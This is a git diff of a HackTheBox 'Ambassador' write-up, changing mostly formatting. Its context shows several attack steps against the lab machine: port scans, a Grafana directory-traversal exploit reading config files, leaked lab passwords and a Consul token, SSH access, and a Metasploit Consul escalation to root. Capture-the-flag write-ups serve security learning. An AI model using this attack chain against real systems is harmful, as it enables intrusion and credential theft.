@@ -3,11 +3,12 @@ title: Ambassador
 date: 2023-01-28 09:15:00 -5000
 categories: [HTB,Medium,Linux]
 tags: [Web,SQL,Reconnaissance,Directory Traversal,Grafana,Common Applications, Outdated Software, Clear Text Credentials, Arbitrary File Read]
+image:
+  path: /Assets/Pictures/Ambassador/Ambassador.webp
+  lqip: data:image/webp
 ---
-# Ambassador
 
-Ambassador is a medium Linux machine on HackTheBox(HTB) created by **DirecRoot.**
-![Ambassador](/Assets/Pictures/Ambassador/Ambassador.png)
+Ambassador is a medium Linux machine on HackTheBox(HTB) created by **DirecRoot.**\
 
 # Intelligence Gathering
 
@@ -20,6 +21,7 @@ PORT     STATE SERVICE REASON
 3000/tcp open  ppp     syn-ack
 3306/tcp open  mysql   syn-ack
 ```
+{: .nolineno }
 
 Let’s enumerate their service versions.
 
@@ -92,6 +94,7 @@ PORT     STATE SERVICE     VERSION
 [SNIP]
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno }
 
 Now that we know the service running and their version, we can start the enumeration process.
 
@@ -139,6 +142,7 @@ d0n in ~/Ambassador/Intell on ☁️
 File Type: Python script, ASCII text executable
 Copied to: /home/d0n/Ambassador/Intell/50581.py
 ```
+{: .nolineno }
 
 # Foothold
 
@@ -155,6 +159,7 @@ grafana:x:113:118::/usr/share/grafana:/bin/false
 mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 consul:x:997:997::/home/consul:/bin/false
 ```
+{: .nolineno }
 
 Once run, we now know the different users present on the server. After that, I need to see which file was readable from the configuration files. As suggested by the official [documentation](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/), we can read the config file stored in `/etc/grafana/grafana.ini` . Once done, we soon realize that this file is leaking so much information such as the database instances and users. But most importantly, the admin password for the grafana site.
 
@@ -176,6 +181,7 @@ admin_password = messageInABottle685427
 # disable gravatar profile images
 ;disable_gravatar = false
 ```
+{: .nolineno }
 
 After logging to `http://ambassador.htb:3000`, using the disclosed admin password found on the configuration file.
 
@@ -214,6 +220,7 @@ kv_store                    user
 library_element             user_auth                 
 library_element_connection  user_auth_token
 ```
+{: .nolineno }
 
 So now we have access to the grafana database of our victim, we can enumerate the database and see what we can get from it, let’s enumerate it.
 
@@ -221,6 +228,7 @@ So now we have access to the grafana database of our victim, we can enumerate th
 sqlite> select * from data_source;
 2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-20 05:15:59|0|{}|1|uKewFgM4z
 ```
+{: .nolineno }
 
 Now we got the mysql user and password, we can connect to the database using those credentials
 
@@ -250,6 +258,7 @@ MySQL [(none)]> show databases;
 +--------------------+
 6 rows in set (1.379 sec)
 ```
+{: .nolineno }
 
 now we can start enumerating the whackywidget database and see it content.
 
@@ -266,6 +275,7 @@ MySQL [whackywidget]> select * from users;
 +-----------+------------------------------------------+
 1 row in set (0.278 sec)
 ```
+{: .nolineno }
 
 We got a base64 string for the password, we just need to convert it and we can use it to log in the victim via ssh.
 
@@ -303,6 +313,7 @@ Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
 developer@ambassador:~$ ls
 snap  user.txt
 ```
+{: .nolineno }
 
 Now that we got the user flag, let’s escalate the privilege.
 
@@ -320,6 +331,7 @@ After running linpeas, we found this.
                                                                                                                    
 drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git
 ```
+{: .nolineno }
 
 A .git folder. Let’s look it out right away…
 
@@ -343,6 +355,7 @@ index 35c08f6..fc51ec0 100755
 -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
 +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
 ```
+{: .nolineno }
 
 After some googling about consul, we found some references for the privilege escalation [here](https://vulners.com/osv/OSV:GHSA-CCW8-7688-VQX4). 
 
@@ -374,8 +387,8 @@ meterpreter > getuid
 Server username: root
 meterpreter > pwd
 /
-
 ```
+{: .nolineno }
 
 Now that we have the superuser privilege, we can get the root flag and the box has been pwned. 
 There is also a manual way of doing it, I just was not able to make it work but will eventually update the page once it's done.
